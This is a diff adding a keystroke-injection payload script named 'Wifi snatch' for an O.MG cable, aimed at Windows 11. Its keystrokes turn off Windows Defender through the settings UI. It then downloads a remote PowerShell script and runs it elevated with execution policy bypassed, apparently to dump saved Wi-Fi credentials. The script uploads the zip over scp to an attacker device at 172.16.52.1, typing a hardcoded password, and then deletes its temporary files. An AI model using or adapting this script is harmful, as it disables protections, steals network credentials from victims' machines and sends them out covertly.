@@ -1,0 +1,77 @@
+REM --------------------------------------------------Payload-------------------------------------------------------
+REM Wifi snatch
+REM OMG script using hotkeys and run commands to kill windows defender, dump wifi and upload to wifi pager thru scp
+REM Windows 11
+REM f3bandit
+REM ----------------------------------------------------------------------------------------------------------------
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN windowsdefender:
+DELAY 1000
+ENTER
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+SPACE
+DELAY 200
+ALT F4
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN powershell -NoProfile -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path $env:TEMP\wifi -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/f3bandit/omg/main/magic.ps1' -OutFile $env:TEMP\wifi\magic.ps1"
+windows r
+DELAY 1000
+STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -ExecutionPolicy Bypass -Command & \"%TEMP%\wifi\magic.ps1\"'"
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN powershell -NoP -NoExit -Command "scp \"$env:TEMP\wifi\wifi.zip\" root@172.16.52.1:/mmc/root/loot/wifi/"
+DELAY 1000
+STRINGLN 685876
+DELAY 1000
+ALT F4
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoP -NonI -Command Remove-Item -Path \"$env:TEMP\wifi\" -Recurse -Force'"
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN windowsdefender:
+DELAY 1000
+TAB
+DELAY 200
+SPACE
+DELAY 200
+ALT F4
+windows r
+DELAY 1000
+STRINGLN windowsdefender:
+DELAY 1000
+TAB
+DELAY 200
+SPACE
+DELAY 200
+ALT F4
